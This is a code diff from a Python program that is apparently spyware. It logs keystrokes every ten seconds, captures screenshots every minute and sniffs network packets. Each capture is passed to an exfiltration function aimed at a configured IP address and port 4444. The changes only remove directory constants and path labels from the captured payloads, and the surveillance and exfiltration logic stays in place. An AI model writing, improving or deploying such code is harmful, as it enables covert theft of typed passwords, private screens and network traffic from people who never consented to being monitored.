@@ -13,9 +13,6 @@ import io
 
 TARGET_IP = "127.0.0.1"
 TARGET_PORT = 4444
-KEYLOG_DIR = r"C:\Users\<User>\Downloads"
-SCREENSHOT_DIR = r"C:\Users\<User>\Downloads"
-PACKETS_DIR = r"C:\Users\<User>\Downloads"
 KEYLOG_INTERVAL = 10
 SCREENSHOT_INTERVAL = 60
 NETWORK_SNIFFER_TIMEOUT = 60
@@ -145,7 +142,7 @@ def start_keylogger():
             stamp = time.strftime("%Y-%m-%d %H:%M:%S")
             time.sleep(KEYLOG_INTERVAL)
             if current_log:
-                data = f"[keylog]{KEYLOG_DIR}\n[{stamp}] {''.join(current_log)}\n".encode()
+                data = f"[keylog][{stamp}] {''.join(current_log)}\n".encode()
                 exfil_data(data)
                 current_log.clear()
     listener = keyboard.Listener(on_press=on_press)
@@ -160,7 +157,7 @@ def capture_screenshots():
         stamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
         stream = io.BytesIO()
         shot.save(stream, format="PNG")
-        data = b"[screenshot]" + SCREENSHOT_DIR.encode() + b"\n" + stamp.encode() + b"\n" + stream.getvalue()
+        data = b"[screenshot]" + stamp.encode() + b"\n" + stream.getvalue()
         exfil_data(data)
         stream.close()
         time.sleep(SCREENSHOT_INTERVAL)
@@ -168,7 +165,7 @@ def capture_screenshots():
 def start_sniffer():
     def packet_callback(packet):
         stamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        data = f"[packets]{PACKETS_DIR}\n[{stamp}] {packet.summary()}\n".encode()
+        data = f"[packets][{stamp}] {packet.summary()}\n".encode()
         exfil_data(data)
     sniff(prn=packet_callback, store=0, timeout=NETWORK_SNIFFER_TIMEOUT)
 
